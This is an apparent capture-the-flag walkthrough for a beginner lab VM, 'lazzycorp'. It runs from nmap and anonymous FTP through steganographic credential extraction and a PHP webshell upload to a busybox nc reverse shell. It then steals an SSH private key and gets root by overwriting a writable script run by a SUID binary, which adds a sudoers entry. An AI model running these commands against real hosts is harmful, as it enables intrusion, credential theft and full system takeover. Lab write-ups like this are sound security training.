vmname: lazzycorp
author: anonmahaa
difficulty: beginner

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.135 08:00:27:53:AA:35 VirtualBox
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ nmap -sC -sV -p- -T4 192.168.100.135
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 16:04 WIB
Nmap scan report for 192.168.100.135
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      119          4096 Jul 16  2025 pub
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
|_  256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: LazyCorp | Empowering Devs
| http-robots.txt: 2 disallowed entries
|_/cms-admin.php /auth-LazyCorp-dev/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
```

FTP:
```bash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ ftp 192.168.100.135
Connected to 192.168.100.135.
220 (vsFTPd 3.0.5)
Name (192.168.100.135:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||62990|)
150 Here comes the directory listing.
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 .
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 ..
drwxr-xr-x    2 114      119          4096 Jul 16  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||53804|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      119          4096 Jul 16  2025 .
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 ..
-rw-r--r--    1 0        0         1366786 Jul 16  2025 note.jpg
226 Directory send OK.
ftp> get note.jpg
local: note.jpg remote: note.jpg
229 Entering Extended Passive Mode (|||5863|)
150 Opening BINARY mode data connection for note.jpg (1366786 bytes).
100% |*****************************|  1334 KiB   18.85 MiB/s    00:00 ETA
226 Transfer complete.
1366786 bytes received in 00:00 (18.21 MiB/s)
ftp> bye
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ file note.jpg
note.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2296x4080, components 3

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ feroxbuster -u http://192.168.100.135/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,php,js,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.135/
 🚩  In-Scope Url          │ 192.168.100.135
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, js, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c http://192.168.100.135/auth-LazyCorp-dev
404      GET        9l       31w      277c http://192.168.100.135/cms-admin.php
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      100w      744c http://192.168.100.135/blog/blog.php
200      GET       17l       47w      582c http://192.168.100.135/
301      GET        9l       28w      317c http://192.168.100.135/blog => http://192.168.100.135/blog/
200      GET       17l       47w      582c http://192.168.100.135/index.html
200      GET       26l      136w     1060c http://192.168.100.135/blog/blog1.php
200      GET        2l        4w       55c http://192.168.100.135/robots.txt
301      GET        9l       28w      320c http://192.168.100.135/uploads => http://192.168.100.135/uploads/
[####################] - 38s    71310/71310   0s      found:9       errors:0
[####################] - 20s    23755/23755   1172/s  http://192.168.100.135/
[####################] - 30s    23755/23755   782/s   http://192.168.100.135/blog/
[####################] - 21s    23755/23755   1139/s  http://192.168.100.135/uploads/           
```


devlog1:
![alt text](image.png)
in the sc: ` <!-- Arvind: He used note.jpg again. Let's see how long it lasts this time. -->`
devlog2:
![alt text](image-1.png)
in the sc: ` <!-- Hidden Hint: Sometimes the simplest transfer method—one that preserves every byte—protects the hidden secrets best. -->`
devlog3:
![alt text](image-2.png)
in the sc: `<!-- Arvind: Reset script was never meant to be writeable by anyone... yet here we are. -->`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/cms-admin.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-LazyCorp-dev/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/dev_admin_portal/login.php
<h1>Access Denied</h1>
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/uploads/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>
``` 

lets enum the content of robots.txt endpoint.
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ feroxbuster -u http://192.168.100.135/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.135/auth-lazycorp-dev
 🚩  In-Scope Url          │ 192.168.100.135
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, js, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c http://192.168.100.135/cms-admin.php
404      GET        9l       31w      277c http://192.168.100.135/auth-LazyCorp-dev
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      330c http://192.168.100.135/auth-lazycorp-dev => http://192.168.100.135/auth-lazycorp-dev/
301      GET        9l       28w      338c http://192.168.100.135/auth-lazycorp-dev/uploads => http://192.168.100.135/auth-lazycorp-dev/uploads/
200      GET       21l       53w      710c http://192.168.100.135/auth-lazycorp-dev/login.php
302      GET        0l        0w        0c http://192.168.100.135/auth-lazycorp-dev/dashboard.php => login.php
```

succeed login, in endpoint: 
http://192.168.100.135/auth-lazycorp-dev/dashboard.php
![alt text](image-3.png)

lets upload php webshell.
![webshell](image-4.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-lazycorp-dev/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

rce.

setup listener:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

trigger:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-lazycorp-dev/uploads/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

connected:
```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58170
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$ cd /
www-data@arvindlazycorp:/$ export SHELL=/bin/bash
www-data@arvindlazycorp:/$ export TERM=xterm-256color
www-data@arvindlazycorp:/$ stty rows 50 cols 200
```

```bash
www-data@arvindlazycorp:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
arvind:x:1000:1000:arvind:/home/arvind:/bin/bash
www-data@arvindlazycorp:/$ ls -la /home/arvind/
total 60
drwxr-xr-x 5 arvind arvind  4096 Jul 16  2025 .
drwxr-xr-x 3 root   root    4096 Jul  5  2025 ..
-rw------- 1 arvind arvind    16 Jul 16  2025 .bash_history
-rw-r--r-- 1 arvind arvind   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 arvind arvind  3771 Feb 25  2020 .bashrc
drwx------ 2 arvind arvind  4096 Jul  5  2025 .cache
drwxrwxr-x 3 arvind arvind  4096 Jul  7  2025 .local
-rw-r--r-- 1 arvind arvind   807 Feb 25  2020 .profile
drwxr-xr-x 2 arvind arvind  4096 Jul  9  2025 .ssh
-rw-r--r-- 1 arvind arvind     0 Jul  5  2025 .sudo_as_admin_successful
-rwsr-xr-x 1 root   root   16744 Jul 16  2025 reset
-rw-r--r-- 1 arvind arvind    28 Jul 16  2025 user.txt
```

```bash
www-data@arvindlazycorp:/$ cd /home/arvind/
www-data@arvindlazycorp:/home/arvind$ which strings
/usr/bin/strings
www-data@arvindlazycorp:/home/arvind$ strings reset
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/usr/bin/reset_site.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
...
```

`/usr/bin/reset_site.sh`

```bash
www-data@arvindlazycorp:/home/arvind$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9  2025 /usr/bin/reset_site.sh
www-data@arvindlazycorp:/home/arvind$ file /usr/bin/reset_site.sh
/usr/bin/reset_site.sh: Bourne-Again shell script, ASCII text executable
www-data@arvindlazycorp:/home/arvind$ cat /usr/bin/reset_site.sh
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
rm -rf /var/www/html/*
# Restore from backup
cp -r /opt/backup/* /var/www/html/
# Set correct ownership
chown -R www-data:www-data /var/www/html/

echo "[+] Done resetting."
```

```bash
www-data@arvindlazycorp:/home/arvind$ cd .ssh
www-data@arvindlazycorp:/home/arvind/.ssh$ ls -la
total 20
drwxr-xr-x 2 arvind arvind 4096 Jul  9  2025 .
drwxr-xr-x 5 arvind arvind 4096 Jul 16  2025 ..
-rw------- 1 arvind arvind  747 Jul  9  2025 authorized_keys
-rw-r--r-- 1 arvind arvind 3389 Jul  9  2025 id_rsa
-rw-r--r-- 1 arvind arvind  747 Jul  9  2025 id_rsa.pub
```
semua sudah jelas, mari berganti user ke arvind dengan priv key serta ganti isi dari /usr/bin/reset_site.sh
```bash
www-data@arvindlazycorp:/home/arvind/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
..............................[REDACTED]..............................
O/7dFLMYo/OOMwAAABVhcnZpbmRAYXJ2aW5kbGF6eWNvcnABAgME
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ vim id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ ssh -i id_rsa arvind@192.168.100.135
...
arvind@arvindlazycorp:~$
```

```bash
arvind@arvindlazycorp:~$ vim /usr/bin/reset_site.sh
arvind@arvindlazycorp:~$ cat /usr/bin/reset_site.sh
#!/bin/bash
echo "arvind ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/arvind
chown root:root /etc/sudoers.d/arvind
chmod 0440 /etc/sudoers.d/arvind
arvind@arvindlazycorp:~$ ./reset
arvind@arvindlazycorp:~$ sudo su
root@arvindlazycorp:/home/arvind# cd
root@arvindlazycorp:~# id
uid=0(root) gid=0(root) groups=0(root)
root@arvindlazycorp:~# whoami ; hostname
root
arvindlazycorp
root@arvindlazycorp:~# cat /home/arvind/user.txt /root/root.txt
FLAG{you_got_foothold_nice}
FLAG{lazycorp_reset_exploit_worked}
```